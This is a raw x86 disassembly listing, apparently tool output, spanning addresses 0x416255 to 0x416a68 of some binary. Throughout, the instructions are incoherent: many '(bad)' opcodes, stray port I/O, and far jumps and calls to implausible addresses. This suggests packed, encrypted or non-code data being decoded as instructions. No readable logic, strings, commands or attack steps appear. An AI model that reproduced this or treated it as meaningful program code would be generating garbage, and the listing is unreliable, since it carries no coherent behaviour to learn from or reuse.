  416255:	jae    0x4162a3
  416257:	in     al,0x95
  416259:	loop   0x41621c
  41625b:	pop    esp
  41625c:	xor    ebp,ecx
  41625e:	fistp  QWORD PTR ds:0x23fa9443
  416264:	test   al,0x11
  416266:	out    0x82,eax
  416268:	adc    BYTE PTR [ecx+edi*1],bl
  41626b:	cs out dx,al
  41626d:	pop    ebp
  41626e:	push   ss
  41626f:	mov    ah,0x7a
  416271:	popa   
  416272:	mov    eax,0xe6ab1941
  416277:	xchg   dl,bl
  416279:	addr16 cmp al,0xa1
  41627c:	push   ebp
  41627d:	lods   eax,DWORD PTR ds:[esi]
  41627e:	mov    esp,0x2fbe855b
  416283:	sub    BYTE PTR [ebx+0x49],dl
  416286:	mov    dh,0x8a
  416288:	adc    al,BYTE PTR [edx-0x7ea7a9ba]
  41628e:	enter  0xf3a9,0x60
  416292:	cmp    BYTE PTR [ebx+0x42],ah
  416295:	sbb    cl,BYTE PTR [edx]
  416297:	(bad)  
  416299:	cs mov esi,0x4999e8f3
  41629f:	push   ss
  4162a0:	mov    ch,0xb0
  4162a2:	div    DWORD PTR [eax]
  4162a4:	dec    eax
  4162a5:	pslld  mm6,mm5
  4162a8:	mov    dl,bh
  4162aa:	mov    dh,0xd1
  4162ac:	cdq    
  4162ad:	jg     0x416290
  4162af:	shl    BYTE PTR [eax+0x75f7334a],1
  4162b5:	(bad)  
  4162b6:	out    0x87,eax
  4162b8:	int    0xa9
  4162ba:	mov    ebx,DWORD PTR [eax+0x53]
  4162bd:	dec    esi
  4162be:	inc    esi
  4162bf:	pusha  
  4162c0:	cmp    al,0xdc
  4162c2:	imul   ebx,DWORD PTR [ecx],0x5d
  4162c5:	stos   DWORD PTR es:[edi],eax
  4162c6:	out    dx,eax
  4162c7:	outs   dx,DWORD PTR ds:[esi]
  4162c8:	hlt    
  4162c9:	dec    ebp
  4162ca:	cmp    ch,BYTE PTR [ebx-0x2b]
  4162cd:	into   
  4162ce:	and    ebp,DWORD PTR [ecx+0x4a]
  4162d1:	mov    ebp,0x53c4b222
  4162d6:	mov    dh,0xbb
  4162d8:	sbb    eax,ebx
  4162da:	mov    bl,0x30
  4162dc:	mov    ah,0x3f
  4162de:	(bad)  
  4162df:	mov    edx,0x8c20d35
  4162e4:	in     eax,dx
  4162e5:	mov    esi,0x5693bc31
  4162ea:	test   BYTE PTR [edx-0x4],0xe9
  4162ee:	imul   esp,DWORD PTR [esi],0x78
  4162f1:	jl     0x416340
  4162f3:	xchg   esp,eax
  4162f4:	test   DWORD PTR [ebp+0x243b84b9],edi
  4162fa:	pop    ebx
  4162fb:	pop    eax
  4162fc:	out    dx,eax
  4162fd:	jmp    0xbb5b:0x96e03611
  416304:	jbe    0x4162aa
  416306:	lods   eax,DWORD PTR ds:[esi]
  416307:	test   BYTE PTR [edx-0x8],0xac
  41630b:	hlt    
  41630c:	addr16 sub ebp,edi
  41630f:	xchg   ecx,eax
  416310:	push   ds
  416311:	fsubr  DWORD PTR [ecx+ebx*8-0x1e3b0f2c]
  416318:	cs inc ebx
  41631a:	es xchg ebp,eax
  41631c:	fldenv [edi-0x40]
  41631f:	js     0x416341
  416321:	mov    al,0x20
  416323:	or     esp,DWORD PTR [esi+0x318b6536]
  416329:	inc    ecx
  41632a:	ror    ebp,cl
  41632c:	dec    ebx
  41632d:	cld    
  41632e:	ror    BYTE PTR [ecx-0x3b],0x7
  416332:	inc    edx
  416333:	(bad)  
  416334:	lods   al,BYTE PTR ds:[esi]
  416335:	adc    eax,DWORD PTR [edi]
  416337:	rol    BYTE PTR [ebx+0x4a],cl
  41633a:	ret    
  41633b:	outs   dx,BYTE PTR ds:[esi]
  41633c:	arpl   WORD PTR [ebx],bx
  41633e:	push   edx
  41633f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416340:	mov    ch,0xa8
  416342:	adc    BYTE PTR [ecx],al
  416344:	addr16 push es
  416346:	add    al,0x44
  416348:	sti    
  416349:	adc    DWORD PTR [edi-0xe],0x63
  41634d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41634e:	adc    ch,BYTE PTR [edi+esi*1+0x26]
  416352:	xchg   edx,eax
  416353:	sub    cl,bh
  416355:	or     esi,DWORD PTR [edi+0x1ccd30f7]
  41635b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41635c:	jb     0x4163d4
  41635e:	and    al,0xfb
  416360:	ror    ah,1
  416362:	sbb    dh,BYTE PTR [ecx]
  416364:	(bad)  
  416365:	scas   al,BYTE PTR es:[edi]
  416366:	dec    esp
  416367:	mov    al,ds:0x321369b5
  41636c:	mov    bl,0xf8
  41636e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41636f:	pop    ecx
  416370:	or     eax,0xcb0000fe
  416375:	or     DWORD PTR [esi],ebx
  416377:	sub    al,0x1f
  416379:	inc    edx
  41637a:	cmp    ecx,DWORD PTR [edi]
  41637c:	shr    BYTE PTR [edx+0x73],cl
  41637f:	in     eax,0x38
  416381:	mov    WORD PTR [ebp+0xd],ds
  416384:	push   esp
  416385:	repz pop ebp
  416387:	in     al,dx
  416388:	outs   dx,DWORD PTR ds:[esi]
  416389:	xchg   esp,eax
  41638a:	or     eax,0x99971b89
  41638f:	aad    0xf7
  416391:	inc    esp
  416392:	inc    edx
  416393:	mov    dl,BYTE PTR [ecx+0x7c00cc64]
  416399:	push   edi
  41639a:	inc    esp
  41639b:	ret    0x9c2f
  41639e:	and    eax,0x3fd12b31
  4163a3:	add    eax,0x7bc5c28e
  4163a8:	pushf  
  4163a9:	cmp    edi,eax
  4163ab:	jo     0x416356
  4163ad:	stc    
  4163ae:	mov    esp,0xc036e16e
  4163b3:	add    eax,0x817302d7
  4163b8:	(bad)
  4163bc:	inc    edi
  4163bd:	mov    dh,0xfa
  4163bf:	mov    bh,0xe0
  4163c1:	mov    bh,0x8
  4163c3:	lds    eax,FWORD PTR [edx-0x2c4c76cb]
  4163c9:	pop    esi
  4163ca:	pop    ss
  4163cb:	sbb    DWORD PTR [eax+0x2dd462f2],ebp
  4163d1:	xor    eax,0x88a2a715
  4163d6:	or     BYTE PTR [ecx-0x72],al
  4163d9:	sbb    BYTE PTR [ebx-0x80],bh
  4163dc:	shl    DWORD PTR [ecx-0x4ce66aac],cl
  4163e2:	adc    BYTE PTR [ebx+edx*1-0x5f],ah
  4163e6:	inc    ecx
  4163e7:	aam    0x2a
  4163e9:	jnp    0x41638a
  4163eb:	sti    
  4163ec:	fcmovnu st,st(4)
  4163ee:	push   es
  4163ef:	dec    esi
  4163f0:	mov    esi,DWORD PTR [ebx-0x73]
  4163f3:	fstp   QWORD PTR [ecx+ebx*8+0x41e34d1]
  4163fa:	mov    ecx,DWORD PTR [esi]
  4163fc:	sbb    ecx,eax
  4163fe:	scas   eax,DWORD PTR es:[edi]
  4163ff:	mov    ebx,0x3e390393
  416404:	inc    ebp
  416405:	adc    BYTE PTR [esi+0x7c],al
  416408:	sub    esi,edi
  41640a:	jmp    0x4163e7
  41640c:	sbb    al,0x6f
  41640e:	push   ecx
  41640f:	iret   
  416410:	inc    esp
  416411:	mov    eax,0x8b057ee9
  416416:	mov    ah,cl
  416418:	fs cmp al,0xe2
  41641b:	mov    al,ds:0x83249718
  416420:	addr16 dec ecx
  416422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416423:	xchg   ecx,eax
  416424:	rcr    BYTE PTR [ebp-0x6e117b71],cl
  41642a:	mov    edi,0x3c707bdf
  41642f:	test   al,0x5d
  416431:	mov    ebx,0xaf75c03
  416436:	mov    ds:0x6d03fced,al
  41643b:	mov    dh,0x4a
  41643d:	xlat   BYTE PTR ds:[ebx]
  41643e:	out    0x5b,eax
  416440:	shl    BYTE PTR [eax+0x7c9b1ea5],1
  416446:	mov    eax,0x89d7ee59
  41644b:	xor    BYTE PTR [esi+0x1b],0xbf
  41644f:	rol    BYTE PTR [eax+ebx*2-0x4a098ffe],0x55
  416457:	mov    esi,0x5c136ccb
  41645c:	adc    BYTE PTR [esi-0x81488a8],dl
  416462:	xor    eax,0xbda17093
  416467:	cli    
  416468:	jb     0x4164a5
  41646a:	loop   0x41640e
  41646c:	mov    ds:0x1307fe5a,al
  416471:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416472:	or     DWORD PTR [ecx-0x26],esp
  416475:	adc    bh,BYTE PTR [edi]
  416477:	jmp    0x62bf37b6
  41647c:	or     BYTE PTR [edi-0x2e],ah
  41647f:	rcl    ch,1
  416481:	and    BYTE PTR [edi+0xf],0x7a
  416485:	scas   al,BYTE PTR es:[edi]
  416486:	xor    ebp,eax
  416488:	and    BYTE PTR [ebp+0x62],ah
  41648b:	shl    BYTE PTR [eax+0x4aa7b6c1],cl
  416491:	or     ebp,ebx
  416493:	xlat   BYTE PTR ds:[ebx]
  416494:	jno    0x4164c9
  416496:	int3   
  416497:	push   0xcc78daac
  41649c:	inc    edi
  41649d:	push   cs
  41649e:	aaa    
  41649f:	add    ah,bh
  4164a1:	pusha  
  4164a2:	adc    eax,0xc78dfd19
  4164a7:	cwde   
  4164a8:	mov    cl,0xfb
  4164aa:	add    dl,dl
  4164ac:	dec    edi
  4164ad:	outs   dx,DWORD PTR ds:[esi]
  4164ae:	inc    esi
  4164af:	cmovbe esp,eax
  4164b2:	and    eax,0x8b673bc8
  4164b7:	inc    ebp
  4164b8:	out    0xe4,al
  4164ba:	in     al,dx
  4164bb:	mov    ecx,0xc690936b
  4164c0:	dec    esi
  4164c1:	popa   
  4164c2:	push   es
  4164c3:	pop    ebp
  4164c4:	inc    esi
  4164c5:	xchg   edx,eax
  4164c6:	dec    edx
  4164c7:	cmp    al,0xe9
  4164c9:	jmp    0x1995befc
  4164ce:	shl    BYTE PTR [ebx+0x62b6ad0e],cl
  4164d4:	jnp    0x416528
  4164d6:	(bad)  
  4164d7:	fld    TBYTE PTR [esi+edi*1-0x49]
  4164db:	out    dx,al
  4164dc:	jne    0x4164e2
  4164de:	jg     0x416500
  4164e0:	in     eax,dx
  4164e1:	or     eax,0x52924a21
  4164e6:	gs fs outs dx,DWORD PTR cs:[esi]
  4164ea:	xor    DWORD PTR [ebp+0x2c],ecx
  4164ed:	call   0x495e:0x61d28c6b
  4164f4:	mov    cl,0xf3
  4164f6:	cmp    al,0x7c
  4164f8:	cmp    al,0x22
  4164fa:	fmul   QWORD PTR [ecx-0x406e651b]
  416500:	popa   
  416501:	xor    al,al
  416503:	mov    ch,0x64
  416505:	mov    eax,ds:0x9e8a1039
  41650a:	xchg   bl,ch
  41650c:	mov    eax,ds:0x16b27733
  416511:	mov    esi,0x3bf14276
  416516:	or     al,0xd5
  416518:	adc    DWORD PTR [eax],0x96f8c4c0
  41651e:	enter  0xdd2c,0xf5
  416522:	pop    esp
  416523:	pop    ebp
  416524:	mov    eax,0x22f89981
  416529:	sbb    eax,DWORD PTR [ebx]
  41652b:	mov    eax,0x2689c95b
  416530:	cld    
  416531:	jae    0x416565
  416533:	test   DWORD PTR [ecx+0x47],ebx
  416536:	xchg   esi,eax
  416537:	pop    edi
  416538:	add    BYTE PTR [esi],bh
  41653a:	cwde   
  41653b:	out    0x1d,al
  41653d:	xchg   ebx,eax
  41653e:	mov    cl,0x47
  416540:	stos   BYTE PTR es:[edi],al
  416541:	add    dh,dh
  416543:	lods   al,BYTE PTR ds:[esi]
  416544:	and    al,0x73
  416546:	add    DWORD PTR [edx-0x7daeaaec],eax
  41654c:	sub    bl,BYTE PTR [edi-0x37]
  41654f:	fistp  WORD PTR ds:[ecx+edi*4+0x673f5dd1]
  416557:	fnstenv [edx+ebx*4-0x1b]
  41655b:	fidivr DWORD PTR [eax+0x4e520d7a]
  416561:	fwait
  416562:	scas   al,BYTE PTR es:[edi]
  416563:	add    cl,0x63
  416566:	(bad)  
  416567:	(bad)  
  416568:	stc    
  416569:	fisub  DWORD PTR [esi-0x74]
  41656c:	add    ebx,DWORD PTR [edi+0x23]
  41656f:	adc    al,0xac
  416571:	vcvtsd2ss xmm0,xmm4,QWORD PTR [eax+0x334e9908]
  416579:	not    BYTE PTR [ebx-0x5827bb72]
  41657f:	adc    eax,0x427e59a9
  416584:	dec    ecx
  416585:	popf   
  416586:	mov    edx,0xf58be904
  41658b:	cld    
  41658c:	and    eax,0xbd577318
  416591:	inc    edx
  416592:	ss xor eax,0x89edb9ba
  416598:	les    esp,FWORD PTR [ebx+ebx*2+0x70]
  41659c:	or     DWORD PTR [edi],ebp
  41659e:	lock jne 0x4165bd
  4165a1:	cli    
  4165a2:	or     edx,DWORD PTR [ecx-0x1c]
  4165a5:	mov    ch,0x92
  4165a7:	sub    al,0xfa
  4165a9:	fst    QWORD PTR [edi+0x18800273]
  4165af:	dec    ebp
  4165b0:	sbb    esi,DWORD PTR [ebp+ebp*2+0x1ad225b8]
  4165b7:	arpl   WORD PTR [esi+ecx*4-0x68],dx
  4165bb:	dec    ebx
  4165bc:	movsx  edi,BYTE PTR [ebx+edx*2+0x30c5216d]
  4165c4:	or     eax,DWORD PTR [edi-0xb8f7944]
  4165ca:	ret    0xe55d
  4165cd:	cwde   
  4165ce:	fdiv   QWORD PTR [edx+0x19]
  4165d1:	(bad)  
  4165d2:	out    dx,al
  4165d3:	mov    bh,0x25
  4165d5:	pop    ebx
  4165d6:	mov    edi,0xa638321f
  4165db:	cwde   
  4165dc:	mov    bl,0x63
  4165de:	or     ch,dh
  4165e0:	cmp    cl,BYTE PTR [ebp+0x2b9548ca]
  4165e6:	int    0x24
  4165e8:	add    esi,eax
  4165ea:	in     al,dx
  4165eb:	stc    
  4165ec:	inc    edi
  4165ed:	push   eax
  4165ee:	test   DWORD PTR [edi-0x216082a2],edx
  4165f4:	jb     0x4165af
  4165f6:	lea    ecx,[ebx+ecx*8]
  4165f9:	dec    esp
  4165fa:	rcr    DWORD PTR [esi+0x7bcdea8d],0xf9
  416601:	cmp    esi,edi
  416603:	dec    ebx
  416604:	dec    esi
  416605:	mov    DWORD PTR [esi],esi
  416607:	jmp    0x2d3c5ae1
  41660c:	mov    ds:0x83b9aa1f,al
  416611:	(bad)  
  416613:	shl    DWORD PTR [eax+ebx*4],cl
  416616:	sub    eax,0xaf558643
  41661b:	jl     0x41659e
  41661d:	cwde   
  41661e:	mov    eax,ds:0x307c792a
  416623:	adc    edx,DWORD PTR [ebp+0x75]
  416626:	push   ss
  416627:	sbb    eax,0xadd349a0
  41662c:	or     dl,dh
  41662e:	mov    dh,0x29
  416630:	loope  0x41666e
  416632:	cwde   
  416633:	fisub  WORD PTR [ebp+eax*2-0x20ad40c5]
  41663a:	adc    ecx,edx
  41663c:	or     ebp,DWORD PTR [eax-0xa72a84f]
  416642:	mov    al,0xc
  416644:	pop    ebp
  416645:	(bad)  [edx-0x34bb7eca]
  41664b:	sbb    bh,BYTE PTR [ebp-0x16ced071]
  416651:	outs   dx,BYTE PTR ds:[esi]
  416652:	adc    eax,edx
  416654:	(bad)  
  416656:	icebp  
  416657:	pop    esp
  416658:	cwde   
  416659:	push   ebx
  41665a:	jg     0x416635
  41665c:	mov    ebx,0x8c3f58cb
  416661:	xor    dl,BYTE PTR [eax+0x591b3b94]
  416667:	mov    al,0x34
  416669:	jmp    0x5505481e
  41666e:	cmp    bh,dh
  416670:	add    ebp,DWORD PTR [ecx]
  416672:	out    dx,eax
  416673:	cmp    BYTE PTR [esi-0x55],bl
  416676:	mov    ds:0xe3216753,eax
  41667b:	retf   
  41667c:	lods   eax,DWORD PTR ds:[esi]
  41667d:	mov    ch,0xbb
  41667f:	mov    edx,0xf9e8b4c6
  416684:	cmp    bh,al
  416686:	dec    ecx
  416687:	stc    
  416688:	ja     0x41664e
  41668a:	inc    edi
  41668b:	not    DWORD PTR [edx]
  41668d:	jae    0x416632
  41668f:	imul   edx,DWORD PTR [eax+0x26],0x288d5a61
  416696:	cmp    eax,0xe6051897
  41669b:	out    0xa2,al
  41669d:	xchg   esi,eax
  41669e:	inc    esp
  41669f:	jecxz  0x41664c
  4166a1:	dec    eax
  4166a2:	mov    eax,ds:0xf447d862
  4166a7:	outs   dx,DWORD PTR ds:[esi]
  4166a8:	mov    bl,0xe4
  4166aa:	sub    bh,BYTE PTR [ecx]
  4166ac:	out    dx,al
  4166ad:	sahf   
  4166ae:	call   0x3d1f:0x64c68bf0
  4166b5:	adc    ebx,DWORD PTR [ecx+edx*2]
  4166b8:	push   0xc247c72c
  4166bd:	mov    WORD PTR [edx-0x38],?
  4166c0:	mov    ds:0x9fe51fcb,al
  4166c5:	(bad)  
  4166c8:	pop    ss
  4166c9:	pop    edi
  4166ca:	call   0xa674a64f
  4166cf:	sub    DWORD PTR [ebp-0x442a6f2b],ebp
  4166d5:	fidiv  WORD PTR [ecx]
  4166d7:	mov    eax,ds:0x393e73f8
  4166dc:	xchg   edx,eax
  4166dd:	push   ds
  4166de:	xor    eax,0x86039c22
  4166e3:	(bad)  
  4166e4:	mov    dh,0xd5
  4166e6:	(bad)  
  4166e7:	push   0x4a
  4166e9:	mov    al,ds:0x624dd6da
  4166ee:	test   BYTE PTR [ebp+0x21406ae3],0x7
  4166f5:	aaa    
  4166f6:	ret    
  4166f7:	mov    WORD PTR [edx],?
  4166f9:	and    al,0xa0
  4166fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166fc:	cs (bad) 
  4166fe:	add    eax,0x4a145e7d
  416703:	ret    
  416704:	pop    edi
  416705:	mov    ebp,0x42ae122d
  41670a:	mov    bh,BYTE PTR [ecx]
  41670c:	jg     0x4166b3
  41670e:	sub    DWORD PTR [edx+0x53bd8a1d],0x121ca243
  416718:	add    eax,0x782eef83
  41671d:	jns    0x4166cd
  41671f:	popf   
  416720:	push   eax
  416721:	xor    esi,ebp
  416723:	jecxz  0x4166f9
  416725:	push   esp
  416726:	daa    
  416727:	int    0xfc
  416729:	jo     0x4167a6
  41672b:	or     eax,0xb754bd5e
  416730:	(bad)  
  416731:	fld    DWORD PTR [esp+ecx*8]
  416734:	loop   0x416779
  416736:	sub    BYTE PTR [edi+edi*8-0x5b],bh
  41673a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41673b:	icebp  
  41673c:	fsub   QWORD PTR [ebx-0x18f6c3e]
  416742:	dec    esi
  416743:	add    DWORD PTR [eax+0x573ee039],edx
  416749:	push   0x49
  41674b:	outs   dx,BYTE PTR ds:[esi]
  41674c:	jecxz  0x416749
  41674e:	shl    dh,0x8
  416751:	repnz out 0x90,eax
  416754:	fnstcw WORD PTR [edi+0x1b]
  416757:	or     dl,BYTE PTR [edi+0x7980795a]
  41675d:	iret   
  41675e:	out    0xcb,eax
  416760:	add    edi,DWORD PTR [ebp+edi*4+0x6254b6be]
  416767:	add    eax,0x81c469aa
  41676c:	cld    
  41676d:	dec    ecx
  41676e:	stos   DWORD PTR es:[edi],eax
  41676f:	in     al,0x2d
  416771:	sub    BYTE PTR [ecx],al
  416773:	add    al,0x6c
  416775:	jbe    0x41671b
  416777:	sub    dl,ch
  416779:	jns    0x416741
  41677b:	push   es
  41677c:	dec    edx
  41677d:	jmp    0x5f0e63af
  416782:	(bad)  
  416783:	mov    dh,0x1f
  416785:	jg     0x416770
  416787:	xchg   DWORD PTR [edx],edx
  416789:	pop    ss
  41678a:	mov    esi,DWORD PTR ds:0x81cb7ca4
  416790:	pop    ebp
  416791:	je     0x4167a8
  416793:	push   es
  416794:	stos   DWORD PTR es:[edi],eax
  416795:	add    al,0x52
  416797:	push   edx
  416798:	mov    ebp,0xcfc1d455
  41679d:	mov    edi,0x1f0ac910
  4167a2:	inc    esi
  4167a3:	sbb    al,0x3
  4167a5:	add    ah,dl
  4167a7:	mov    BYTE PTR [edi+eiz*1-0x55fbeb0e],dl
  4167ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167af:	sbb    al,bh
  4167b1:	mov    al,BYTE PTR [ecx]
  4167b3:	loop   0x41674c
  4167b5:	lds    eax,FWORD PTR [edx+0x536dfb41]
  4167bb:	mov    ds:0xb0515e43,al
  4167c0:	mul    DWORD PTR [ebx]
  4167c2:	push   eax
  4167c3:	hlt    
  4167c4:	in     eax,0xd9
  4167c6:	adc    DWORD PTR [esi-0x15e33630],ebx
  4167cc:	std    
  4167cd:	push   ebp
  4167ce:	dec    ebp
  4167cf:	shl    DWORD PTR [ebp-0x51ef8c38],cl
  4167d5:	es es stos BYTE PTR es:[edi],al
  4167d8:	(bad)  
  4167d9:	cmp    al,0x31
  4167db:	adc    DWORD PTR [edi-0x78],edx
  4167de:	xchg   ecx,eax
  4167df:	sbb    DWORD PTR [edx+0x75],0x70
  4167e3:	pop    eax
  4167e4:	shl    BYTE PTR [ecx-0xf],0x53
  4167e8:	dec    edx
  4167e9:	in     al,dx
  4167ea:	test   eax,0x46a2e794
  4167ef:	test   DWORD PTR [ecx+0x25c182f8],ebx
  4167f5:	and    ecx,DWORD PTR [eax+0x58]
  4167f8:	mov    ds:0x7cb37183,eax
  4167fd:	lea    bp,[ebp+0x7b]
  416801:	clc    
  416802:	sbb    eax,0x631e5b91
  416807:	in     eax,0x8c
  416809:	mov    ah,0xbf
  41680b:	xlat   BYTE PTR ds:[ebx]
  41680c:	jne    0x4167e2
  41680e:	xchg   edx,eax
  41680f:	out    0x2,al
  416811:	mov    BYTE PTR [ebp+0x34],bl
  416814:	loope  0x4167d5
  416816:	iret   
  416817:	inc    ebx
  416818:	bnd jae 0x41683c
  41681b:	and    cl,BYTE PTR [edx+0x571f7a3a]
  416821:	aas    
  416822:	inc    esp
  416823:	(bad)  [ecx-0x64]
  416826:	cmp    BYTE PTR [eax+0x3bf7a332],ch
  41682c:	mov    edx,0x8dc6c88e
  416831:	sbb    esp,DWORD PTR [ebx]
  416833:	and    dh,BYTE PTR [eax+0x5d]
  416836:	inc    ebp
  416837:	(bad)  
  416838:	call   0xdd5f7fb
  41683d:	adc    eax,0x8808a2ef
  416842:	jbe    0x416831
  416844:	and    eax,0x20fe79cc
  416849:	mov    ebx,DWORD PTR [ebx]
  41684b:	not    BYTE PTR [esi+ebp*1]
  41684e:	ficom  WORD PTR [esi]
  416850:	popa   
  416851:	xchg   ebx,eax
  416852:	pop    ecx
  416853:	cs mov bh,0x99
  416856:	fnstenv [edx+ebx*2+0x3742d23]
  41685d:	or     eax,0x929891bf
  416862:	mov    edi,0xc47cdefb
  416867:	data16 icebp 
  416869:	mov    ds:0x21e00371,eax
  41686e:	sbb    al,0x51
  416870:	push   ebx
  416871:	xchg   esi,eax
  416872:	leave  
  416873:	stc    
  416874:	out    dx,eax
  416875:	fisttp DWORD PTR ds:0x6383943d
  41687b:	jbe    0x416830
  41687d:	lea    ebp,[esi+0x2f]
  416880:	leave  
  416881:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416882:	dec    esi
  416883:	bound  ebx,QWORD PTR [ebx-0x2f377b1d]
  416889:	mov    ebx,0xf5d6813a
  41688e:	mov    bl,0xca
  416890:	mov    edi,0x3adea511
  416895:	mov    edi,0xec62628f
  41689a:	jb     0x41689a
  41689c:	and    al,0xcf
  41689e:	mov    ebx,0x9a422c4a
  4168a3:	xor    BYTE PTR [ebp+0x371a5eba],0xbd
  4168aa:	fsubr  QWORD PTR [ebx]
  4168ac:	jle    0x41687a
  4168ae:	js     0x416858
  4168b0:	sub    ch,BYTE PTR [eax+0x41352e9f]
  4168b6:	test   al,0x42
  4168b8:	cs out 0x4,al
  4168bb:	ja     0x41691c
  4168bd:	dec    edx
  4168be:	(bad)  
  4168bf:	lock or eax,0x6a2a81ab
  4168c5:	mov    bh,0x7f
  4168c7:	pop    edi
  4168c8:	or     al,cl
  4168ca:	in     eax,0x93
  4168cc:	pop    ds
  4168cd:	test   al,0x4b
  4168cf:	sbb    al,0xc1
  4168d1:	outs   dx,BYTE PTR ds:[esi]
  4168d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168d3:	outs   dx,BYTE PTR ds:[esi]
  4168d4:	punpcklwd mm6,mm7
  4168d7:	mov    edi,0xd0126107
  4168dc:	iret   
  4168dd:	addr16 cmp al,0x97
  4168e0:	push   esi
  4168e1:	aaa    
  4168e2:	retf   0x4c0e
  4168e5:	inc    ebp
  4168e6:	iret   
  4168e7:	adc    DWORD PTR [ecx],ebx
  4168e9:	push   ebx
  4168ea:	mov    edx,0xbde74f30
  4168ef:	xchg   DWORD PTR [ecx+0x76],eax
  4168f2:	aad    0x30
  4168f4:	pushf  
  4168f5:	mov    eax,ds:0x580f51eb
  4168fa:	test   al,0x3a
  4168fc:	ss push es
  4168fe:	pop    ecx
  4168ff:	sbb    al,0x71
  416901:	stos   DWORD PTR es:[edi],eax
  416902:	cmp    dh,cl
  416904:	xchg   DWORD PTR [ebx-0x35],ebp
  416907:	popa   
  416908:	pop    eax
  416909:	cmp    dh,bh
  41690b:	rol    DWORD PTR [ecx+0x3871c6a5],cl
  416911:	mov    esi,0x7850558c
  416916:	adc    al,0x1f
  416918:	dec    ebp
  416919:	sbb    bl,dh
  41691b:	or     BYTE PTR ds:0xaeb16b6a,0xd6
  416922:	or     bh,BYTE PTR [ebp-0x2bcbf49f]
  416928:	idiv   BYTE PTR [ebp+0x62e001d2]
  41692e:	popa   
  41692f:	pushf  
  416930:	or     DWORD PTR [ebx+0x41],edx
  416933:	es pop edx
  416935:	sub    eax,0xacc852a1
  41693a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41693b:	nop
  41693c:	inc    ebx
  41693d:	ror    ebp,cl
  41693f:	add    BYTE PTR [ebx-0x38],bh
  416942:	mov    esp,0xa5fad105
  416947:	mov    cl,BYTE PTR [ebp-0x3afb7b6d]
  41694d:	or     BYTE PTR [ebp-0x46],0x59
  416951:	or     al,0x97
  416953:	mov    ds:0x85bf2311,al
  416958:	jecxz  0x4169d3
  41695a:	sti    
  41695b:	cld    
  41695c:	xchg   esi,eax
  41695d:	pop    esi
  41695e:	xor    al,BYTE PTR [esi]
  416960:	dec    eax
  416961:	adc    ebx,DWORD PTR [ecx]
  416963:	sti    
  416964:	xchg   esp,eax
  416965:	(bad)  
  416966:	cmp    edi,ebx
  416968:	repz fidivr DWORD PTR [eax-0x6d2b8f1f]
  41696f:	test   DWORD PTR [edx-0x6d2b47fa],edx
  416975:	cmp    al,0xa7
  416977:	jmp    DWORD PTR [edi+0x1d9eb306]
  41697d:	push   es
  41697e:	adc    eax,0x11288e4d
  416983:	xor    ecx,eax
  416985:	sbb    ebp,edx
  416987:	xchg   DWORD PTR [eax],edi
  416989:	cmp    bh,ah
  41698b:	mov    eax,ds:0x3eef63cf
  416990:	int3   
  416991:	jne    0x416959
  416993:	aaa    
  416994:	add    edx,edi
  416996:	sub    al,0x86
  416998:	xchg   DWORD PTR [edi-0x48994ede],esi
  41699e:	(bad)  
  41699f:	adc    al,0x5b
  4169a1:	mov    WORD PTR [ecx+0x88b5d20],fs
  4169a7:	call   0x63ca:0xa826e94
  4169ae:	mov    ecx,0x291a2743
  4169b3:	cld    
  4169b4:	cmp    BYTE PTR [edi+edi*8],cl
  4169b7:	and    DWORD PTR [edx+0x4],0x9faaf281
  4169be:	sahf   
  4169bf:	rol    DWORD PTR [ecx+eiz*4],cl
  4169c2:	or     eax,0xd03ba030
  4169c7:	add    eax,0x6e6266e6
  4169cc:	and    BYTE PTR [eax-0x5a562131],cl
  4169d2:	push   ecx
  4169d3:	test   DWORD PTR [esi+0x77],0xc52863b1
  4169da:	jecxz  0x416a22
  4169dc:	jns    0x4169e6
  4169de:	aam    0xab
  4169e0:	sar    BYTE PTR [edi-0x52],1
  4169e3:	retf   0x54ef
  4169e6:	int    0x28
  4169e8:	push   es
  4169e9:	lods   eax,DWORD PTR ds:[esi]
  4169ea:	popa   
  4169eb:	rol    BYTE PTR [eax],1
  4169ed:	dec    eax
  4169ee:	jbe    0x416976
  4169f0:	or     eax,0x5056781a
  4169f5:	(bad)
  4169f8:	sbb    edx,DWORD PTR [ebx+0x6c1736dc]
  4169fe:	(bad)  
  4169ff:	push   ebx
  416a00:	in     eax,dx
  416a01:	and    DWORD PTR [ebx+0x6674cd5d],ebx
  416a07:	lds    edx,FWORD PTR [edx-0x1f]
  416a0a:	jle    0x416a5f
  416a0c:	out    dx,eax
  416a0d:	xor    DWORD PTR [esi+0x68],esi
  416a10:	fldenv ds:0xad592a6
  416a16:	leave  
  416a17:	mov    ds:0xa5d4e389,eax
  416a1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a1d:	xchg   esi,eax
  416a1e:	mov    cl,0xc6
  416a20:	xor    DWORD PTR [ebx-0x55],edi
  416a23:	fcom   DWORD PTR [edi-0x29]
  416a26:	mov    WORD PTR [ebp-0x46],ss
  416a29:	mov    ds:0xbd8f0c70,al
  416a2e:	lds    ebp,FWORD PTR [ebp-0x64]
  416a31:	ins    DWORD PTR es:[edi],dx
  416a32:	inc    ebx
  416a33:	repz cli 
  416a35:	or     DWORD PTR [eax+0x5e2a6bb7],eax
  416a3b:	sbb    BYTE PTR [edi+0x3c],0x81
  416a3f:	nop
  416a40:	cmp    cl,BYTE PTR [edi+0x725fadcb]
  416a46:	aaa    
  416a47:	out    0x3f,al
  416a49:	scas   al,BYTE PTR es:[edi]
  416a4a:	aad    0xe4
  416a4c:	sbb    al,BYTE PTR [esi-0x17]
  416a4f:	scas   al,BYTE PTR es:[edi]
  416a50:	mov    bl,0x47
  416a52:	call   0xf64f:0xfc38f18d
  416a59:	mov    bh,0x79
  416a5b:	or     ch,al
  416a5d:	jne    0x4169e9
  416a5f:	jp     0x416a44
  416a61:	lds    eax,FWORD PTR [esi+edx*4]
  416a64:	adc    al,0x8b
  416a66:	add    bl,BYTE PTR [edx]
  416a68:	inc    ecx
